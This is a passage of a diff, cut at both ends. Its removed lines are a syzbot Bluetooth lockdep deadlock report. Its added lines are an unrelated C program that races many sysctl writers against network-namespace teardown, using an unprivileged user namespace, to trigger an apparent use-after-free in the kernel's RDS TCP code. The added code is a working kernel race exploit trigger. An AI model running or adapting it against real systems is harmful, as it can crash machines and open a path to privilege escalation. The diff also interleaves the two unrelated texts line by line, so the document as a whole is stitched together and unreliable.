-       __se_sys_sendmsg net/socket.c:2773 [inline]
-       __x64_sys_sendmsg+0x1b1/0x290 net/socket.c:2773
-       do_syscall_x64 arch/x86/entry/syscall_64.c:63 [inline]
-       do_syscall_64+0x174/0x580 arch/x86/entry/syscall_64.c:94
-       entry_SYSCALL_64_after_hwframe+0x77/0x7f
+static void send_fd_over_unix_socket(int unix_sock, int fd_to_send)
+{
+	char byte = 0;
+	char control[CMSG_SPACE(sizeof(fd_to_send))];
+	struct iovec iov = { .iov_base = &byte, .iov_len = sizeof(byte) };
+	struct msghdr msg = {
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+		.msg_control = control,
+		.msg_controllen = sizeof(control),
+	};
+	struct cmsghdr *cmsg;
 
--> #1 (&q->q_usage_counter(io)#50){++++}-{0:0}:
-       blk_alloc_queue+0x544/0x690 block/blk-core.c:504
-       blk_mq_alloc_queue block/blk-mq.c:4420 [inline]
-       __blk_mq_alloc_disk+0x194/0x390 block/blk-mq.c:4467
-       nbd_dev_add+0x494/0xb60 drivers/block/nbd.c:1991
-       nbd_init+0x15f/0x1e0 drivers/block/nbd.c:2729
-       do_one_initcall+0x250/0x870 init/main.c:1347
-       do_initcall_level+0x10a/0x1a0 init/main.c:1409
-       do_initcalls+0x59/0xa0 init/main.c:1425
-       kernel_init_freeable+0x29d/0x3e0 init/main.c:1658
-       kernel_init+0x1d/0x1d0 init/main.c:1548
-       ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
-       ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
+	memset(control, 0, sizeof(control));
+	cmsg = CMSG_FIRSTHDR(&msg);
+	cmsg->cmsg_level = SOL_SOCKET;
+	cmsg->cmsg_type = SCM_RIGHTS;
+	cmsg->cmsg_len = CMSG_LEN(sizeof(fd_to_send));
+	memcpy(CMSG_DATA(cmsg), &fd_to_send, sizeof(fd_to_send));
 
--> #0 (fs_reclaim){+.+.}-{0:0}:
-       check_prev_add kernel/locking/lockdep.c:3165 [inline]
-       check_prevs_add kernel/locking/lockdep.c:3284 [inline]
-       validate_chain kernel/locking/lockdep.c:3908 [inline]
-       __lock_acquire+0x1520/0x2cf0 kernel/locking/lockdep.c:5237
-       lock_acquire+0x106/0x350 kernel/locking/lockdep.c:5868
-       __fs_reclaim_acquire mm/page_alloc.c:4329 [inline]
-       fs_reclaim_acquire+0x71/0x100 mm/page_alloc.c:4343
-       might_alloc include/linux/sched/mm.h:317 [inline]
-       slab_pre_alloc_hook mm/slub.c:4565 [inline]
-       slab_alloc_node mm/slub.c:4925 [inline]
-       __do_kmalloc_node mm/slub.c:5361 [inline]
-       __kmalloc_noprof+0xbc/0x720 mm/slub.c:5387
-       _kmalloc_noprof include/linux/slab.h:973 [inline]
-       _kzalloc_noprof include/linux/slab.h:1290 [inline]
-       kobject_get_path+0xc5/0x2f0 lib/kobject.c:161
-       kobject_move+0x2fa/0x720 lib/kobject.c:556
-       device_move+0xe0/0x720 drivers/base/core.c:4689
-       hci_conn_del_sysfs+0xb8/0x1a0 net/bluetooth/hci_sysfs.c:75
-       hci_conn_cleanup net/bluetooth/hci_conn.c:170 [inline]
-       hci_conn_del+0xc3d/0x1200 net/bluetooth/hci_conn.c:1306
-       hci_abort_conn_sync+0xdd0/0x1190 net/bluetooth/hci_sync.c:5805
-       hci_cmd_sync_work+0x20b/0x3f0 net/bluetooth/hci_sync.c:332
-       process_one_work kernel/workqueue.c:3322 [inline]
-       process_scheduled_works+0xa8e/0x14e0 kernel/workqueue.c:3405
-       worker_thread+0xa47/0xfb0 kernel/workqueue.c:3486
-       kthread+0x388/0x470 kernel/kthread.c:436
-       ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
-       ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
+	if (sendmsg(unix_sock, &msg, 0) < 0)
+		die("sendmsg(SCM_RIGHTS)");
+}
 
-other info that might help us debug this:
+static int recv_fd_over_unix_socket(int unix_sock)
+{
+	int received_fd = -1;
+	char byte;
+	char control[CMSG_SPACE(sizeof(received_fd))];
+	struct iovec iov = { .iov_base = &byte, .iov_len = sizeof(byte) };
+	struct msghdr msg = {
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+		.msg_control = control,
+		.msg_controllen = sizeof(control),
+	};
+	struct cmsghdr *cmsg;
 
-Chain exists of:
-  fs_reclaim --> cpuhp_state-up --> dpm_list_mtx
+	memset(control, 0, sizeof(control));
+	if (recvmsg(unix_sock, &msg, 0) <= 0)
+		return -1;
 
- Possible unsafe locking scenario:
+	cmsg = CMSG_FIRSTHDR(&msg);
+	if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS)
+		return -1;
 
-       CPU0                    CPU1
-       ----                    ----
-  lock(dpm_list_mtx);
-                               lock(cpuhp_state-up);
-                               lock(dpm_list_mtx);
-  lock(fs_reclaim);
+	memcpy(&received_fd, CMSG_DATA(cmsg), sizeof(received_fd));
+	return received_fd;
+}
 
- *** DEADLOCK ***
+static void target_netns_child(int parent_control_sock)
+{
+	int sysctl_fd;
+	char release_byte;
 
-5 locks held by kworker/u9:1/4940:
- #0: ffff8880507ad140 ((wq_completion)hci5){+.+.}-{0:0}, at: process_one_work kernel/workqueue.c:3297 [inline]
- #0: ffff8880507ad140 ((wq_completion)hci5){+.+.}-{0:0}, at: process_scheduled_works+0xa20/0x14e0 kernel/workqueue.c:3405
- #1: ffffc9000fe5fc40 ((work_completion)(&hdev->cmd_sync_work)){+.+.}-{0:0}, at: process_one_work kernel/workqueue.c:3297 [inline]
- #1: ffffc9000fe5fc40 ((work_completion)(&hdev->cmd_sync_work)){+.+.}-{0:0}, at: process_scheduled_works+0xa20/0x14e0 kernel/workqueue.c:3405
- #2: ffff888064c14ea0 (&hdev->req_lock){+.+.}-{4:4}, at: hci_cmd_sync_work+0x1cb/0x3f0 net/bluetooth/hci_sync.c:331
- #3: ffff888064c140b8 (&hdev->lock){+.+.}-{4:4}, at: hci_abort_conn_sync+0xa6f/0x1190 net/bluetooth/hci_sync.c:5786
- #4: ffffffff8f5f5880 (dpm_list_mtx){+.+.}-{4:4}, at: device_move+0x3c/0x720 drivers/base/core.c:4678
+	if (unshare(CLONE_NEWNET))
+		_exit(2);
 
-stack backtrace:
-CPU: 0 UID: 0 PID: 4940 Comm: kworker/u9:1 Not tainted syzkaller #0 PREEMPT(full) 
-Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 06/25/2026
-Workqueue: hci5 hci_cmd_sync_work
-Call Trace:
- <TASK>
- dump_stack_lvl+0xe8/0x150 lib/dump_stack.c:120
- print_circular_bug+0x2e1/0x300 kernel/locking/lockdep.c:2043
- check_noncircular+0x12e/0x150 kernel/locking/lockdep.c:2175
- check_prev_add kernel/locking/lockdep.c:3165 [inline]
- check_prevs_add kernel/locking/lockdep.c:3284 [inline]
- validate_chain kernel/locking/lockdep.c:3908 [inline]
- __lock_acquire+0x1520/0x2cf0 kernel/locking/lockdep.c:5237
- lock_acquire+0x106/0x350 kernel/locking/lockdep.c:5868
- __fs_reclaim_acquire mm/page_alloc.c:4329 [inline]
- fs_reclaim_acquire+0x71/0x100 mm/page_alloc.c:4343
- might_alloc include/linux/sched/mm.h:317 [inline]
- slab_pre_alloc_hook mm/slub.c:4565 [inline]
- slab_alloc_node mm/slub.c:4925 [inline]
- __do_kmalloc_node mm/slub.c:5361 [inline]
- __kmalloc_noprof+0xbc/0x720 mm/slub.c:5387
- _kmalloc_noprof include/linux/slab.h:973 [inline]
- _kzalloc_noprof include/linux/slab.h:1290 [inline]
- kobject_get_path+0xc5/0x2f0 lib/kobject.c:161
- kobject_move+0x2fa/0x720 lib/kobject.c:556
- device_move+0xe0/0x720 drivers/base/core.c:4689
- hci_conn_del_sysfs+0xb8/0x1a0 net/bluetooth/hci_sysfs.c:75
- hci_conn_cleanup net/bluetooth/hci_conn.c:170 [inline]
- hci_conn_del+0xc3d/0x1200 net/bluetooth/hci_conn.c:1306
- hci_abort_conn_sync+0xdd0/0x1190 net/bluetooth/hci_sync.c:5805
- hci_cmd_sync_work+0x20b/0x3f0 net/bluetooth/hci_sync.c:332
- process_one_work kernel/workqueue.c:3322 [inline]
- process_scheduled_works+0xa8e/0x14e0 kernel/workqueue.c:3405
- worker_thread+0xa47/0xfb0 kernel/workqueue.c:3486
- kthread+0x388/0x470 kernel/kthread.c:436
- ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
- ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
- </TASK>
-Bluetooth: hci4: command 0x0405 tx timeout
+	touch_rds_tcp_transport();
 
+	sysctl_fd = open(RDS_TCP_SNDBUF_SYSCTL, O_RDWR | O_CLOEXEC);
+	if (sysctl_fd < 0)
+		_exit(3);
 
----
-This report is generated by a bot. It may contain errors.
-See https://goo.gl/tpsmEJ for more information about syzbot.
-syzbot engineers can be reached at syzkaller@googlegroups.com.
+	send_fd_over_unix_socket(parent_control_sock, sysctl_fd);
+	close(sysctl_fd);
 
-syzbot will keep track of this issue. See:
-https://goo.gl/tpsmEJ#status for how to communicate with syzbot.
+	/*
+	 * The parent writes one byte here to make this process exit.
+	 * That exit is the explicit trigger for target netns teardown.
+	 */
+	(void)read(parent_control_sock, &release_byte, 1);
+	_exit(0);
+}
 
-If the report is already addressed, let syzbot know by replying with:
-#syz fix: exact-commit-title
+static void maybe_pin_to_cpu(int cpu)
+{
+	cpu_set_t set;
 
-If you want to overwrite report's subsystems, reply with:
-#syz set subsystems: new-subsystem
-(See the list of subsystem names on the web dashboard)
+	if (cpu < 0)
+		return;
 
-If the report is a duplicate of another one, reply with:
-#syz dup: exact-subject-of-another-report
+	CPU_ZERO(&set);
+	CPU_SET(cpu, &set);
+	(void)sched_setaffinity(0, sizeof(set), &set);
+}
 
-If you want to undo deduplication, reply with:
-#syz undup
+static void writer_child(int sysctl_fd, int start_barrier_fd, int cpu)
+{
+	char start_byte;
+
+	maybe_pin_to_cpu(cpu);
+
+	/* Parent releases this barrier after all writers have been forked. */
+	(void)read(start_barrier_fd, &start_byte, 1);
+
+	for (;;)
+		(void)syscall(SYS_pwrite64, sysctl_fd, SYSCTL_VALUE,
+			      sizeof(SYSCTL_VALUE) - 1, 0);
+}
+
+static void start_all_writers(int barrier_write_fd, int writer_count)
+{
+	for (int i = 0; i < writer_count; i++)
+		(void)write(barrier_write_fd, "s", 1);
+}
+
+static void stop_and_reap_writers(pid_t *writer_pids, int writer_count)
+{
+	for (int i = 0; i < writer_count; i++)
+		kill(writer_pids[i], SIGKILL);
+	for (int i = 0; i < writer_count; i++)
+		waitpid(writer_pids[i], NULL, 0);
+}
+
+static int run_one_race_round(const struct run_config *cfg, int round)
+{
+	int control_sock[2];
+	int writer_start_pipe[2];
+	int target_sysctl_fd;
+	pid_t target_pid;
+	pid_t *writer_pids = calloc((size_t)cfg->writers, sizeof(*writer_pids));
+
+	if (!writer_pids)
+		die("calloc(writer_pids)");
+	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, control_sock))
+		die("socketpair(target control)");
+	if (pipe(writer_start_pipe))
+		die("pipe(writer start)");
+
+	target_pid = fork();
+	if (target_pid < 0)
+		die("fork(target netns child)");
+	if (target_pid == 0) {
+		close(control_sock[0]);
+		close(writer_start_pipe[0]);
+		close(writer_start_pipe[1]);
+		target_netns_child(control_sock[1]);
+	}
+	close(control_sock[1]);
+
+	target_sysctl_fd = recv_fd_over_unix_socket(control_sock[0]);
+	if (target_sysctl_fd < 0) {
+		(void)write(control_sock[0], "x", 1);
+		waitpid(target_pid, NULL, 0);
+		close(control_sock[0]);
+		close(writer_start_pipe[0]);
+		close(writer_start_pipe[1]);
+		free(writer_pids);
+		return -1;
+	}
+
+	for (int i = 0; i < cfg->writers; i++) {
+		writer_pids[i] = fork();
+		if (writer_pids[i] < 0)
+			die("fork(writer child)");
+		if (writer_pids[i] == 0) {
+			close(control_sock[0]);
+			close(writer_start_pipe[1]);
+			writer_child(target_sysctl_fd, writer_start_pipe[0], cfg->writer_cpu);
+		}
+	}
+
+	close(writer_start_pipe[0]);
+
+	/*
+	 * Controlled sequence:
+	 *   1. Start writers.
+	 *   2. Let them hammer the sysctl handler.
+	 *   3. Release target child, which triggers netns teardown.
+	 *   4. Keep writers running while teardown frees the listen socket.
+	 */
+	start_all_writers(writer_start_pipe[1], cfg->writers);
+	close(writer_start_pipe[1]);
+
+	usleep((useconds_t)cfg->pre_teardown_us);
+	(void)write(control_sock[0], "q", 1);
+	usleep((useconds_t)cfg->post_teardown_us);
+
+	stop_and_reap_writers(writer_pids, cfg->writers);
+	waitpid(target_pid, NULL, 0);
+
+	close(target_sysctl_fd);
+	close(control_sock[0]);
+	free(writer_pids);
+
+	if ((round & 15) == 0)
+		printf("round %d\n", round);
+
+	return 0;
+}
+
+static struct run_config parse_config(int argc, char **argv)
+{
+	struct run_config cfg = {
+		.rounds = argc > 1 ? atoi(argv[1]) : DEFAULT_ROUNDS,
+		.writers = argc > 2 ? atoi(argv[2]) : DEFAULT_WRITERS,
+		.pre_teardown_us = argc > 3 ? atoi(argv[3]) : DEFAULT_PRE_TEARDOWN_US,
+		.post_teardown_us = argc > 4 ? atoi(argv[4]) : DEFAULT_POST_TEARDOWN_US,
+		.writer_cpu = argc > 5 ? atoi(argv[5]) : -1,
+	};
+
+	if (cfg.rounds < 1)
+		cfg.rounds = DEFAULT_ROUNDS;
+	if (cfg.writers < 1)
+		cfg.writers = DEFAULT_WRITERS;
+	if (cfg.pre_teardown_us < 0)
+		cfg.pre_teardown_us = DEFAULT_PRE_TEARDOWN_US;
+	if (cfg.post_teardown_us < 1)
+		cfg.post_teardown_us = DEFAULT_POST_TEARDOWN_US;
+
+	return cfg;
+}
+
+int main(int argc, char **argv)
+{
+	struct run_config cfg = parse_config(argc, argv);
+
+	setbuf(stdout, NULL);
+	signal(SIGPIPE, SIG_IGN);
+
+	become_root_in_new_userns();
+	touch_rds_tcp_transport();
+
+	printf("controlled RDS TCP sysctl race: rounds=%d writers=%d pre=%dus post=%dus writer_cpu=%d\n",
+	       cfg.rounds, cfg.writers, cfg.pre_teardown_us,
+	       cfg.post_teardown_us, cfg.writer_cpu);
+
+	for (int round = 0; round < cfg.rounds; round++)
+		(void)run_one_race_round(&cfg, round);
+
+	return 0;
+}
+```
